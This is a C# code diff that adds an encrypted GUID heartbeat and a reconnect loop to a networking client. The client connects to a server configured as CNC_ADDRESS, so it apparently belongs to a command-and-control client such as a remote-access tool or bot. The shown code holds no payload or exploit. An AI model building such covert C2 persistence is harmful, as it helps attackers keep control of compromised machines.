@@ -23,17 +23,20 @@ namespace Client.Core.Networking
             {
                 if (Connection == null)
                     return false;
-                else if (!Connection.ConnectionAlive())
+                else if (!RespondedToHeartbeat)
                     return false;
                 else return true;
             }
         }
+
+        private static bool RespondedToHeartbeat;
         
         public static void Connect()
         {
             try
             {
                 Connection = TCPConnection.GetConnection(new NetworkCommsDotNet.ConnectionInfo(Settings.CNC_ADDRESS, Settings.CNC_PORT));
+                RespondedToHeartbeat = true;
                 SetupHandlers();
             }
             catch
@@ -97,14 +100,22 @@ namespace Client.Core.Networking
         {
             while(true)
             {
-                MessageBox.Show(IsConnected.ToString());
-                if(!IsConnected)
+                string guid = Guid.NewGuid().ToString();
+                try
+                {
+                    RespondedToHeartbeat = Cryptography.Decrypt(Connection.SendReceiveObject<string, string>("HeartbeatReq", "HeartbeatRep", 2000, Cryptography.Encrypt(guid))) == guid;
+                }
+                catch
+                {
+                    RespondedToHeartbeat = false;
+                }
+
+                if (!IsConnected)
                 {
                     Connect();
                 }
                 Thread.Sleep(Settings.CNC_RECONNECT_TIME);
             }
         }
-
     }
 }
